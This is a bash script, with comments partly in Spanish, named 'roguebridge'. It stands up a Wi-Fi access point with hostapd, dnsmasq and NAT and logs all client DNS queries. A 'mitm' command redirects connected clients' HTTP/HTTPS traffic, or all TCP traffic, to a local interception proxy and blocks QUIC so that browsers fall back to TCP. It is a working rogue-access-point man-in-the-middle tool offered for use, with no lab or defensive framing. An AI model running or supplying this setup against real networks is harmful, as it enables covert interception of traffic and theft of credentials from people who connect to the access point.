#!/usr/bin/env bash
# Requisitos: bash, iproute2, iptables, hostapd, dnsmasq, nmcli, iw, grep, sed, awk

set -euo pipefail

### ====== CONFIG POR DEFECTO (sobrescribible por env o CLI) ====== ###
IFACE_AP="${IFACE_AP:-wlan0}"        
IFACE_WAN="${IFACE_WAN:-eth0}"       
SUBNET="${SUBNET:-192.168.50.0/24}"  
AP_IP="${AP_IP:-192.168.50.1}"       
CHANNEL="${CHANNEL:-1}"              
COUNTRY="${COUNTRY:-US}"
HW_MODE="${HW_MODE:-g}"             

DHCP_START="${DHCP_START:-192.168.50.50}"
DHCP_END="${DHCP_END:-192.168.50.100}"
LEASE_TIME="${LEASE_TIME:-12h}"

SSID="${SSID:-roguebridge}"
WPA_PASSPHRASE="${WPA_PASSPHRASE:-admin123}"

MITM_MODE="${MITM_MODE:-off}"        # off|on
MITM_SCOPE="${MITM_SCOPE:-web}"      # web|all
PROXY_PORT="${PROXY_PORT:-8080}"

APPDIR="${APPDIR:-/tmp/roguebridge}"
mkdir -p "$APPDIR/logs"

HOSTAPD_CONF="$APPDIR/hostapd.conf"
HOSTAPD_PID="$APPDIR/hostapd.pid"

DNSMASQ_CONF="${DNSMASQ_CONF:-/etc/dnsmasq.d/roguebridge.conf}"
DNSMASQ_PID="${DNSMASQ_PID:-/run/dnsmasq_roguebridge.pid}"

LOG_FILE="$APPDIR/logs/roguebridge.log"
HOSTAPD_LOG="$APPDIR/logs/hostapd.log"
DNSMASQ_LOG="$APPDIR/logs/dnsmasq.log"

### ====== HELPERS ====== ###
usage() {
  cat <<USAGE
Usage:
  sudo $0 [global options] up
  sudo $0 [global options] down
  sudo $0 [global options] mitm on [port] [web|all]
  sudo $0 [global options] mitm off
  sudo $0 [global options] status

Global options:
  --iface-ap=IF              Interfaz AP (default: $IFACE_AP)
  --iface-wan=IF             Interfaz WAN (default: $IFACE_WAN)
  --subnet=CIDR              Subred AP (default: $SUBNET)
  --ap-ip=IP                 IP AP (default: $AP_IP)
  --channel=N                Canal WiFi (default: $CHANNEL)
  --country=CC               País (default: $COUNTRY)
  --hw-mode=MODE             hostapd hw_mode (default: $HW_MODE)
  --ssid=NAME                SSID (default: $SSID)
  --wpa-pass=PASS            WPA2 passphrase
  --dhcp-start=IP            DHCP inicio (default: $DHCP_START)
  --dhcp-end=IP              DHCP fin (default: $DHCP_END)
  --proxy-port=PORT          Puerto MitM local (default: $PROXY_PORT)
  --appdir=DIR               Dir trabajo hostapd/logs (default: $APPDIR)

Ejemplos:
  sudo $0 --iface-ap=wlan0 --iface-wan=ens34 up
  sudo $0 mitm on 8080 web
USAGE
}

log() {
  local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $*"
  echo "$msg" | tee -a "$LOG_FILE" >&2
}

die() {
  local msg="[-] ERROR: $*"
  echo "$msg" | tee -a "$LOG_FILE" >&2
  exit 1
}

### ====== NETWORK HELPERS ====== ###
check_root() {
  if [ "$(id -u)" -ne 0 ]; then
    die "Debes ejecutarlo como root (sudo)."
  fi
}

check_cmd() {
  command -v "$1" >/dev/null 2>&1 || die "Comando requerido no encontrado: $1"
}

ensure_deps() {
  for c in ip iptables hostapd dnsmasq nmcli iw grep sed awk; do
    check_cmd "$c"
  done
}

get_default_route_iface() {
  ip route show default 2>/dev/null | awk '/default/ {print $5; exit}'
}

ensure_wan_has_internet() {
  local test_ip="1.1.1.1"

  # Si la WAN configurada no existe, usar la del default route
  if ! ip link show "$IFACE_WAN" >/dev/null 2>&1; then
    local route_dev
    route_dev="$(get_default_route_iface || true)"
    if [ -n "$route_dev" ]; then
      log "Configured WAN '$IFACE_WAN' does not exist; using default route iface '$route_dev' instead"
      IFACE_WAN="$route_dev"
    else
      die "Configured WAN '$IFACE_WAN' does not exist y no hay ruta por defecto."
    fi
  fi

  log "Ensuring WAN ($IFACE_WAN) has IP, gateway and Internet reachability"

  if ! ip addr show dev "$IFACE_WAN" | grep -q "inet "; then
    log "WAN $IFACE_WAN sin IPv4; intentando DHCP vía NetworkManager (si aplica)"
    nmcli dev show "$IFACE_WAN" >/dev/null 2>&1 && nmcli dev connect "$IFACE_WAN" || true
    sleep 5
  fi

  local route_dev
  route_dev="$(get_default_route_iface || true)"
  ip route show default | tee -a "$LOG_FILE" || true

  if [ -z "$route_dev" ]; then
    die "No hay ruta por defecto configurada. Configura la conectividad en $IFACE_WAN."
  fi

  if ! ping -c1 -W2 "$test_ip" >/dev/null 2>&1; then
    log "WARNING: No se puede hacer ping a $test_ip; puede no haber Internet, pero continúo..."
  else
    log "WAN reachability OK via ICMP"
  fi
}

disable_ipv6() {
  log "Disabling IPv6 on $IFACE_AP"
  sysctl -w "net.ipv6.conf.$IFACE_AP.disable_ipv6=1" >/dev/null 2>&1 || true
  sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1 || true
}

enable_ipv6() {
  log "Re-enabling IPv6 (system-wide)"
  sysctl -w net.ipv6.conf.all.disable_ipv6=0 >/dev/null 2>&1 || true
  sysctl -w net.ipv6.conf.default.disable_ipv6=0 >/dev/null 2>&1 || true
}

### ====== NetworkManager ====== ###
mark_iface_unmanaged() {
  local iface="$1"
  log "Marking $iface as unmanaged in NetworkManager"
  nmcli dev set "$iface" managed no >/dev/null 2>&1 || true
}

mark_iface_managed() {
  local iface="$1"
  log "Marking $iface as managed again in NetworkManager"
  nmcli dev set "$iface" managed yes >/dev/null 2>&1 || true
}

### ====== REGDOM ====== ###
set_regdom() {
  log "Setting regulatory domain to $COUNTRY"
  iw reg set "$COUNTRY" >/dev/null 2>&1 || log "iw reg set $COUNTRY failed (continuing de todas formas)"
}

### ====== HOSTAPD CONFIG ====== ###
write_hostapd_conf() {
  log "Writing hostapd config to $HOSTAPD_CONF"
  cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE_AP
driver=nl80211
ssid=$SSID
hw_mode=$HW_MODE
channel=$CHANNEL
country_code=$COUNTRY

# LEGACY only (sin 11n/HT para evitar problemas de canal extendido)
ieee80211n=0
wmm_enabled=0

auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=$WPA_PASSPHRASE
EOF
}

configure_ap_ip() {
  log "Configuring $IFACE_AP with IP $AP_IP and enabling it"

  set_regdom

  ip link set "$IFACE_AP" down || true
  ip addr flush dev "$IFACE_AP" || true
  ip addr add "$AP_IP/24" dev "$IFACE_AP"
  ip link set "$IFACE_AP" up
}

clear_ap_ip() {
  log "Clearing IP on $IFACE_AP"
  ip addr flush dev "$IFACE_AP" || true
  ip link set "$IFACE_AP" down || true
}

start_hostapd() {
  : > "$HOSTAPD_LOG" || true
  write_hostapd_conf
  log "Starting hostapd on $IFACE_AP (log: $HOSTAPD_LOG)"
  hostapd -B -P "$HOSTAPD_PID" "$HOSTAPD_CONF" >>"$HOSTAPD_LOG" 2>&1 \
    || die "hostapd no pudo arrancar, revisa $HOSTAPD_LOG"

  sleep 2
  local pid
  pid="$(cat "$HOSTAPD_PID" 2>/dev/null || echo -1)"

  if ! ps -p "$pid" >/dev/null 2>&1; then
    die "hostapd murió después de arrancar. Revisa $HOSTAPD_LOG y $HOSTAPD_CONF"
  fi
}

stop_hostapd() {
  if [ -f "$HOSTAPD_PID" ]; then
    log "Stopping hostapd"
    kill "$(cat "$HOSTAPD_PID")" 2>/dev/null || true
    rm -f "$HOSTAPD_PID"
  fi
}

### ====== DNSMASQ CONFIG ====== ###
write_dnsmasq_conf() {
  log "Writing dnsmasq config to $DNSMASQ_CONF"
  mkdir -p "$(dirname "$DNSMASQ_CONF")"
  cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE_AP
bind-interfaces
listen-address=$AP_IP
no-resolv
server=1.1.1.1
server=8.8.8.8

dhcp-range=$DHCP_START,$DHCP_END,255.255.255.0,$LEASE_TIME
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP

domain-needed
bogus-priv
stop-dns-rebind
expand-hosts
dhcp-authoritative
cache-size=10000

log-queries
log-dhcp
EOF
}

start_dnsmasq() {
  : > "$DNSMASQ_LOG" || true
  write_dnsmasq_conf
  mkdir -p "$(dirname "$DNSMASQ_PID")"
  log "Starting dnsmasq (log: $DNSMASQ_LOG)"
  dnsmasq --pid-file="$DNSMASQ_PID" -C "$DNSMASQ_CONF" >>"$DNSMASQ_LOG" 2>&1
  sleep 1
  local pid
  pid="$(cat "$DNSMASQ_PID" 2>/dev/null || echo -1)"
  if ! ps -p "$pid" >/dev/null 2>&1; then
    die "dnsmasq falló al arrancar. Revisa $DNSMASQ_LOG y $DNSMASQ_CONF"
  fi
}

stop_dnsmasq() {
  if [ -f "$DNSMASQ_PID" ]; then
    log "Stopping dnsmasq"
    kill "$(cat "$DNSMASQ_PID")" 2>/dev/null || true
    rm -f "$DNSMASQ_PID"
  fi
}

### ====== IPTABLES / NAT ====== ###
enable_nat() {
  log "Enabling IPv4 forwarding + NAT from $IFACE_AP to $IFACE_WAN"
  sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || true

  iptables -t nat -D POSTROUTING -o "$IFACE_WAN" -j MASQUERADE 2>/dev/null || true
  iptables -D FORWARD -i "$IFACE_WAN" -o "$IFACE_AP" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
  iptables -D FORWARD -i "$IFACE_AP" -o "$IFACE_WAN" -j ACCEPT 2>/dev/null || true

  iptables -t nat -A POSTROUTING -o "$IFACE_WAN" -j MASQUERADE
  iptables -A FORWARD -i "$IFACE_WAN" -o "$IFACE_AP" -m state --state RELATED,ESTABLISHED -j ACCEPT
  iptables -A FORWARD -i "$IFACE_AP" -o "$IFACE_WAN" -j ACCEPT

  iptables -t mangle -D FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu 2>/dev/null || true
  iptables -t mangle -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu

  log "NAT + TCPMSS clamp enabled"
}

disable_nat() {
  log "Disabling NAT rules for $IFACE_AP -> $IFACE_WAN"
  iptables -t nat -D POSTROUTING -o "$IFACE_WAN" -j MASQUERADE 2>/dev/null || true
  iptables -D FORWARD -i "$IFACE_WAN" -o "$IFACE_AP" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
  iptables -D FORWARD -i "$IFACE_AP" -o "$IFACE_WAN" -j ACCEPT 2>/dev/null || true
  iptables -t mangle -D FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu 2>/dev/null || true
}

### ====== MitM ====== ###
enable_mitm_rules() {
  local port="$1"
  local scope="$2"

  log "Enabling MitM redirection on $IFACE_AP to local port $port (scope: $scope)"

  disable_mitm_rules || true

  iptables -A FORWARD -i "$IFACE_AP" -p udp --dport 443 -j DROP

  if [ "$scope" = "web" ]; then
    iptables -t nat -A PREROUTING -i "$IFACE_AP" -p tcp --dport 80  -j REDIRECT --to-ports "$port"
    iptables -t nat -A PREROUTING -i "$IFACE_AP" -p tcp --dport 443 -j REDIRECT --to-ports "$port"
  else
    iptables -t nat -A PREROUTING -i "$IFACE_AP" -p tcp -j REDIRECT --to-ports "$port"
  fi
}

disable_mitm_rules() {
  log "Disabling MitM redirection rules (if any)"
  iptables -t nat -D PREROUTING -i "$IFACE_AP" -p tcp --dport 80  -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE_AP" -p tcp --dport 443 -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE_AP" -p tcp -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null || true
  iptables -D FORWARD -i "$IFACE_AP" -p udp --dport 443 -j DROP 2>/dev/null || true
}

### ====== STATUS ====== ###
health_checks() {
  echo "=== AP STATUS ($IFACE_AP) ==="
  ip addr show dev "$IFACE_AP" || true
  echo
  echo "=== hostapd (PID from $HOSTAPD_PID) ==="
  if [ -f "$HOSTAPD_PID" ]; then
    ps -p "$(cat "$HOSTAPD_PID")" -o pid,cmd || echo "not running"
  else
    echo "no PID file"
  fi
  echo
  echo "=== dnsmasq (PID from $DNSMASQ_PID) ==="
  if [ -f "$DNSMASQ_PID" ]; then
    ps -p "$(cat "$DNSMASQ_PID")" -o pid,cmd || echo "not running"
  else
    echo "no PID file"
  fi
  echo
  echo "=== iptables NAT for $IFACE_AP -> $IFACE_WAN ==="
  iptables -t nat -L POSTROUTING -n -v | grep -E "MASQUERADE" || true
  echo
  echo "=== IPv4 forwarding ==="
  sysctl net.ipv4.ip_forward || true
  echo
  echo "=== Logs ==="
  echo "Main log: $LOG_FILE"
  echo "hostapd:  $HOSTAPD_LOG"
  echo "dnsmasq:  $DNSMASQ_LOG"
}

### ====== ACCIONES PRINCIPALES ====== ###
do_up() {
  check_root
  ensure_deps
  log "==== roguebridge.sh UP ===="
  log "IFACE_AP=$IFACE_AP IFACE_WAN=$IFACE_WAN AP_IP=$AP_IP SSID=$SSID CHANNEL=$CHANNEL COUNTRY=$COUNTRY"

  mark_iface_unmanaged "$IFACE_AP"
  configure_ap_ip
  disable_ipv6
  ensure_wan_has_internet
  enable_nat
  start_dnsmasq
  start_hostapd

  log "AP UP: SSID=$SSID, AP_IP=$AP_IP, WAN=$IFACE_WAN, CHANNEL=$CHANNEL"
}

do_down() {
  check_root
  log "==== roguebridge.sh DOWN ===="
  stop_hostapd
  stop_dnsmasq
  disable_nat
  clear_ap_ip
  enable_ipv6
  mark_iface_managed "$IFACE_AP"
  log "AP DOWN complete"
}

do_mitm_on() {
  check_root
  local port="${1:-$PROXY_PORT}"
  local scope="${2:-$MITM_SCOPE}"

  case "$scope" in
    web|all) ;;
    *) die "Invalid MitM scope: $scope (expected web|all)" ;;
  esac

  PROXY_PORT="$port"
  enable_mitm_rules "$port" "$scope"
  log "MitM mode ON; asegúrate de que tu proxy escucha en el puerto $port"
}

do_mitm_off() {
  check_root
  disable_mitm_rules
  log "MitM mode OFF"
}

### ====== PARSING ARGS ====== ###
ACTION=""
ACTION_ARGS=()

while [ $# -gt 0 ]; do
  case "$1" in
    --iface-ap=*)   IFACE_AP="${1#*=}"; shift ;;
    --iface-wan=*)  IFACE_WAN="${1#*=}"; shift ;;
    --subnet=*)     SUBNET="${1#*=}"; shift ;;
    --ap-ip=*)      AP_IP="${1#*=}"; shift ;;
    --channel=*)    CHANNEL="${1#*=}"; shift ;;
    --country=*)    COUNTRY="${1#*=}"; shift ;;
    --hw-mode=*)    HW_MODE="${1#*=}"; shift ;;
    --ssid=*)       SSID="${1#*=}"; shift ;;
    --wpa-pass=*)   WPA_PASSPHRASE="${1#*=}"; shift ;;
    --dhcp-start=*) DHCP_START="${1#*=}"; shift ;;
    --dhcp-end=*)   DHCP_END="${1#*=}"; shift ;;
    --proxy-port=*) PROXY_PORT="${1#*=}"; shift ;;
    --appdir=*)
      APPDIR="${1#*=}"
      mkdir -p "$APPDIR/logs"
      HOSTAPD_CONF="$APPDIR/hostapd.conf"
      HOSTAPD_PID="$APPDIR/hostapd.pid"
      LOG_FILE="$APPDIR/logs/roguebridge.log"
      HOSTAPD_LOG="$APPDIR/logs/hostapd.log"
      DNSMASQ_LOG="$APPDIR/logs/dnsmasq.log"
      shift
      ;;
    up|down|status)
      ACTION="$1"; shift ;;
    mitm)
      ACTION="mitm"; shift
      ACTION_ARGS=("$@")
      break
      ;;
    -h|--help|help)
      usage; exit 0 ;;
    *)
      echo "Unknown argument: $1"
      usage; exit 1 ;;
  esac
done

if [ -z "${ACTION:-}" ]; then
  usage
  exit 1
fi

case "$ACTION" in
  up)     do_up ;;
  down)   do_down ;;
  status) health_checks ;;
  mitm)
    case "${ACTION_ARGS[0]:-}" in
      on)  do_mitm_on "${ACTION_ARGS[1]:-}" "${ACTION_ARGS[2]:-}" ;;
      off) do_mitm_off ;;
      *)   echo "Uso: $0 [opts] mitm on [port] [web|all] | mitm off"; exit 1 ;;
    esac
    ;;
  *) usage; exit 1 ;;
esac
